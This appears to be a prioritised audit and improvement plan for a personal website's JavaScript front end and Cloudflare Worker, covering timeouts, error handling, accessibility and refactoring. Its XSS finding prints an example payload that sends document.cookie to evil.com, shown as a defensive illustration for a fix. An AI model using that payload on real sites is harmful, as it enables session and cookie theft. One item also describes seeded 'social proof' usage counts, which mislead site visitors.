# Givelink Personal Site — Improvement Plan

> Audited: 2026-05-05 | Stack: Vanilla JS + Cloudflare Workers + GitHub Pages

---

## 🔥 P0 — Ship this week (bugs breaking user flows)

### 1. No request timeout — tool form permanently locks up on slow API

- **What**: If the Cloudflare Worker or Anthropic API hangs, the streaming fetch never resolves, the submit button stays disabled forever, and the user's only escape is a page reload.
- **Where**: `tool-utils.js:121` (streaming fetch), `tool-utils.js:188` (fallback fetch), `tool-utils.js:148–184` (streaming while-loop)
- **Why it matters**: On any API hiccup (cold start, Anthropic latency spike), the user is stuck mid-flow with a permanently frozen form. A hard refresh loses their input. High-friction failure mode on a conversion tool.
- **Effort**: S
- **Suggested fix**:
  - Wrap each `fetch` call with `AbortController` + `setTimeout(abort, 30_000)`.
  - In the catch, call `showError('Request timed out — please try again.')` and re-enable the submit button.
  - Existing `setLoading(false)` in the `finally` block already resets the button; just ensure the timeout triggers `setLoading(false)` too.

---

### 2. XSS — AI output rendered via `innerHTML` with no sanitization

- **What**: Both `parseMarkdown` (chat) and `formatMarkdown` (tools) inject AI-generated text directly into `innerHTML` without escaping HTML first, making the site vulnerable to prompt-injection XSS.
- **Where**: `chat.js:79` (`p.innerHTML = parseMarkdown(text)`), `tool-utils.js:169`, `176`, `335`, `340`, `1061`, `1080`, `1543`
- **Why it matters**: A user (or a compromised API response) can craft input like `**<img src=x onerror=fetch('https://evil.com/?c='+document.cookie)>**` and the `<img>` tag executes when the response renders. localStorage chat history and any ambient cookies are exposed.
- **Effort**: S
- **Suggested fix**:
  - Add an `escapeHtml(str)` helper that replaces `&`, `<`, `>`, `"`, `'` with their HTML entities.
  - Call it on the raw text **before** passing to `parseMarkdown`/`formatMarkdown`: `parseMarkdown(escapeHtml(text))`.
  - The regex transforms then operate on safe escaped text, so `<strong>`, `<em>`, `<br>`, and `<a>` tags produced by the regexes are the only HTML that enters `innerHTML`.

---

### 3. Chat swallows all API errors with the same generic message

- **What**: `sendMessage` has no `res.ok` check before `res.json()`, so rate-limit 429s, server 500s, and network failures all show identical "Connection error. Email … directly!" with no actionable guidance.
- **Where**: `chat.js:160–183`
- **Why it matters**: Rate-limiting is the most common real-world failure. Tool pages show a 30-second countdown timer on 429 (`tool-utils.js:205–220`); the chat shows nothing, causing users to spam-retry (worsening the rate limit) or leave entirely.
- **Effort**: S
- **Suggested fix**:
  - After `await fetch(...)`, add `if (res.status === 429) { addMessage('bot', "You're sending messages quickly — please wait 30 seconds and try again."); return; }`.
  - Check `if (!res.ok)` before parsing JSON, and display `data.error` if present.
  - Move the `finally { chatSend.disabled = false; }` block so it still runs in all error branches.

---

## ⚡ P1 — High ROI (UX friction blocking conversion)

### 4. Progress bar stuck at 88% — broken loading affordance on any slow response

- **What**: The tool progress bar animates to 88% over 9 seconds and then freezes there until the response arrives, creating a "frozen" appearance on responses that take 10–30 seconds.
- **Where**: `tool-utils.js:293–300` (`fill.style.width = '88%'` with 9s transition)
- **Why it matters**: Users interpret a frozen bar as a crash and refresh, abandoning the tool mid-generation. First impressions of the AI tools are dominated by this pattern.
- **Effort**: S
- **Suggested fix**:
  - Replace the single 9s tween with a pulsing shimmer CSS animation (already used elsewhere in `style.css` for skeletons) that plays until the first stream chunk arrives.
  - Alternatively, switch to an indeterminate striped progress bar (`background-size: 200% 100%; animation: shimmer 1.5s infinite`) that never implies a percentage.
  - Keep the 0→100% snap on completion (line 304–306), which already works correctly.

---

### 5. No retry affordance after tool errors — dead end for users

- **What**: When `showError` is called, it displays an error message box but provides no "Try again" button; the user must manually scroll up, clear the form state, and resubmit.
- **Where**: `tool-utils.js:317–322` (`showError`), all tool HTML pages (no `#retryBtn` element exists)
- **Why it matters**: Tools like `charity-comparison-engine` and `what-would-x-do` have multi-field forms. A transient network error forces the user to start over, sharply increasing abandonment.
- **Effort**: S
- **Suggested fix**:
  - In `showError`, dynamically append a `<button>` with class `tool-error-retry` that calls `document.getElementById('submitBtn').click()`.
  - Remove the retry button in `hideError`.
  - No HTML changes required in individual tool pages since `showError` is shared via `tool-utils.js`.

---

### 6. `formatMarkdown` strips most markdown — AI tool output looks poorly formatted

- **What**: `formatMarkdown` only handles `**bold**` and newlines; headers (`# H1`), unordered lists (`- item`), numbered lists, and code blocks are output as raw text with literal `#`, `-`, and backtick characters.
- **Where**: `tool-utils.js:222–226`
- **Why it matters**: Claude's output for the impact and comparison tools consistently uses `##` headers and `- bullet` lists to structure comparisons. These render as ASCII noise, making outputs look amateurish next to the polished UI.
- **Effort**: M
- **Suggested fix**:
  - Extend `formatMarkdown` to handle `## Heading` → `<h3>`, `- list item` → `<li>` (wrapped in `<ul>` per group), and `` `code` `` → `<code>`.
  - Process line-by-line using `.split('\n')`, categorise each line, then join.
  - Cap complexity: no need for nested lists or tables — the AI prompts don't produce those.

---

### 7. Confetti animation ignores `prefers-reduced-motion` — accessibility & battery issue

- **What**: The 65-particle canvas confetti fires on every first session visit with no check for `prefers-reduced-motion: reduce`, and runs 140 animation frames regardless of device.
- **Where**: `script.js:162–210`
- **Why it matters**: Users with vestibular disorders find full-screen motion disorienting (WCAG 2.3.3 criterion). On mobile, 140 rAF iterations at first-load drains battery and can cause jank on lower-end devices. This is the first thing every new visitor sees.
- **Effort**: S
- **Suggested fix**:
  - Add a guard at the top of the IIFE: `if (window.matchMedia('(prefers-reduced-motion: reduce)').matches) return;`
  - Reduce `length` from 65 to 30 for `window.innerWidth < 768` (tablet/phone) to cut rAF work by 54%.

---

### 8. Clipboard write shows success even when it fails

- **What**: The copy button in `initCopyBtn` and the share link button both call `navigator.clipboard.writeText()` with no `.catch()`, so a `NotAllowedError` (clipboard permission denied, non-HTTPS context) renders the button as "Copied!" while nothing was actually copied.
- **Where**: `tool-utils.js:404–409` (copy button), `tool-utils.js:487–490` (share link button)
- **Why it matters**: Users on HTTP dev previews or browsers with clipboard permission blocked get false confirmation, then wonder why pasting yields nothing.
- **Effort**: S
- **Suggested fix**:
  - Add `.catch(() => { copyBtn.textContent = 'Copy failed'; setTimeout(() => { copyBtn.textContent = 'Copy'; }, 2000); })` to both calls.
  - Extract a shared `copyToClipboard(text, btn, successLabel)` helper (see P2 #11) to avoid the fix diverging.

---

## 🛠 P2 — Code health (tech debt slowing velocity)

### 9. `style.css` is 8,198 lines — one change touches everything

- **What**: All component styles, utility classes, dark-mode overrides, animations, and third-party widget resets live in a single file with no logical sections beyond loose comments.
- **Where**: `style.css` (entire file, 267 KB)
- **Why it matters**: Any change to e.g. a tool card risks accidentally overriding a hero section rule. `grep` for a class name can return 12+ hits across unrelated sections. IDE performance degrades on lower-spec machines with a 8K-line file open.
- **Effort**: L
- **Suggested fix**:
  - Split into: `base.css` (reset, variables, typography), `layout.css` (header, footer, grid), `components.css` (cards, buttons, forms), `tools.css` (tool-page-specific), `animations.css`.
  - Use `<link>` tags or a build step (even a simple `cat` in a Makefile) — no bundler needed since this is a static site.
  - Do **not** introduce utility classes (Tailwind-style); the existing BEM-ish naming is consistent and should be preserved.

---

### 10. `tool-utils.js` is 1,680 lines with 5 mixed concerns

- **What**: API communication, DOM rendering, clipboard, analytics, markdown formatting, loading states, share buttons, usage counters, and history management all live in one file.
- **Where**: `tool-utils.js` (entire file, 75 KB)
- **Why it matters**: PRs that touch any tool feature require reading 1,680 lines to understand side-effects. Critical paths (streaming fetch, error display) are buried between unrelated helpers.
- **Effort**: L
- **Suggested fix**:
  - Extract into: `tool-api.js` (callWorker, rate-limit logic), `tool-ui.js` (setLoading, showError, showResult, progress bar), `tool-history.js` (save/restore, offline cache), `markdown.js` (formatMarkdown).
  - No behaviour changes required — just move functions and expose them via a shared `window.ToolUtils` namespace or ES modules if a bundler is added later.

---

### 11. Clipboard copy pattern duplicated in 3 places with diverging behaviour

- **What**: The clipboard write+feedback pattern is implemented separately in `script.js:694–701` (with deprecated `execCommand` fallback), `tool-utils.js:404–409` (no `.catch()`), and `tool-utils.js:487–490` (no `.catch()`).
- **Where**: `script.js:694–701`, `tool-utils.js:404–409`, `tool-utils.js:487–490`
- **Why it matters**: The three implementations have three different bugs. Any future fix must be applied three times.
- **Effort**: S
- **Suggested fix**:
  - Create a single `copyToClipboard(text)` utility that: (1) tries `navigator.clipboard.writeText`, (2) falls back to a temporary `<textarea>` + `document.execCommand('copy')` only if needed, (3) returns a Promise resolving to `true`/`false`.
  - Replace all three call-sites with the shared utility.
  - Remove the standalone `execCommand` fallback from `script.js:699` — it currently reports success even when it silently fails.

---

### 12. Digest-subscriber notification is fire-and-forget — subscriber data may be lost

- **What**: When a user subscribes to the email digest, `cloudflare-worker.js` sends a MailChannels email (correctly awaited) then fires a secondary Panos-notification fetch with `.catch(() => {})`, silently dropping any failure.
- **Where**: `cloudflare-worker.js:269–275`
- **Why it matters**: If the notify endpoint is down, Panos never gets alerted of a new subscriber. Since the email to the user still goes out, there's no way to retroactively recover the lost subscriber event.
- **Effort**: S
- **Suggested fix**:
  - Wrap in `try/catch` and log the error to Cloudflare's `console.error` so it surfaces in Workers Logs: `try { await fetch(...) } catch (e) { console.error('notify failed', e.message); }`.
  - Alternatively, write subscriber events to a KV namespace as a fallback audit log.

---

### 13. Zero test coverage on any critical path

- **What**: No test framework exists; `callWorker`, `parseMarkdown`, rate-limit error handling, and localStorage history all have 0% coverage.
- **Where**: Repository root (no `test/`, no `*.test.js`, no `package.json` test script)
- **Why it matters**: The XSS fix (P0 #2), timeout fix (P0 #1), and formatMarkdown extension (P1 #6) are all easy to regress silently. The streaming path is particularly tricky to get right.
- **Effort**: M
- **Suggested fix**:
  - Add Vitest (zero-config, no bundler needed for vanilla JS with `jsdom` environment).
  - Write tests for: `escapeHtml` (proposed helper), `parseMarkdown` / `formatMarkdown` output, `scoreEntry` in `search.js`, and the rate-limit countdown logic in `_showRateLimitError`.
  - Target: 10 focused tests covering the 4 riskiest functions — not full coverage.

---

## 💡 P3 — Nice to have

### 14. PostHog captures events but not exceptions — no visibility into frontend errors

- **What**: PostHog is initialised on every page and tracks `contact_intent`, `tool_usage`, and search opens, but there are no `posthog.capture('error', ...)` calls anywhere in the codebase.
- **Where**: `chat.js:111–131`, `tool-utils.js:228–248`, `search.js:98–100` (existing capture sites)
- **Why it matters**: When the streaming API fails, the catch block in each tool silently calls `showError()`; there's no PostHog signal to know how often this happens or which tools are most affected.
- **Effort**: S
- **Suggested fix**:
  - In the generic catch of each tool's submit handler, add `posthog?.capture('tool_error', { tool: toolName, message: err.message })`.
  - In `chat.js:177–179`, add `posthog?.capture('chat_error', { type: err?.name })`.

---

### 15. Follow-up chat chips are always random — frequently irrelevant to the prior message

- **What**: After every bot reply, `showFollowUpChips` selects 2 chips at random from a static pool of 4, regardless of what was discussed.
- **Where**: `chat.js:94–108`, `chat.js:87–92` (chip pool)
- **Why it matters**: A user asking about Givelink metrics gets chips for "How can I contact Panos?" — weak personalisation that makes the chat feel bot-like.
- **Effort**: M
- **Suggested fix**:
  - Tag each chip with a `topic` (e.g. `'givelink'`, `'contact'`, `'podcast'`).
  - After receiving the bot reply, run `detectAndTrackIntent` on it (already exists at `chat.js:120`) and prefer chips whose topic matches the detected intent.
  - Fall back to random selection when no intent is detected.

---

### 16. Search UI shows no result count and no "loading" state while fetching index

- **What**: `search.js` fetches `/search-index.json` lazily on first open, but there's no spinner or "Loading…" message while it fetches; if it's slow, the empty state appears with no explanation.
- **Where**: `search.js:10–17` (loadIndex), `search.js:58–63` (renderEmpty)
- **Why it matters**: On a slow connection, opening the search modal looks broken until the index loads.
- **Effort**: S
- **Suggested fix**:
  - In `openModal`, set `resultsPane.innerHTML = '<p class="ss-hint">Loading…</p>'` before calling `loadIndex()`, then re-render after `loadIndex` resolves.
  - After a successful search, prefix the results pane with `<p class="ss-count">${results.length} result${results.length !== 1 ? 's' : ''}</p>`.

---

### 17. Hardcoded usage-count seeds require manual file edits to stay accurate

- **What**: `tool-utils.js` contains a `_USAGE_SEEDS` object with hardcoded "social proof" counts (e.g., `'/what-would-x-do': 1240`) that add to the live localStorage counter but are never updated automatically.
- **Where**: `tool-utils.js` (search for `_USAGE_SEEDS`, lines ~50–80)
- **Why it matters**: Seeds drift over time — a tool that now has 3,000 real uses still shows ~1,240 + local count if the seed is stale. This weakens the social proof signal that's meant to drive conversions.
- **Effort**: S
- **Suggested fix**:
  - Add a nightly Cloudflare Worker cron (`scheduled` handler) that reads a KV counter and writes the aggregate to a `/usage-counts.json` endpoint.
  - `_renderUsageCount` fetches this once per session and uses it as the seed, falling back to hardcoded values on network failure.
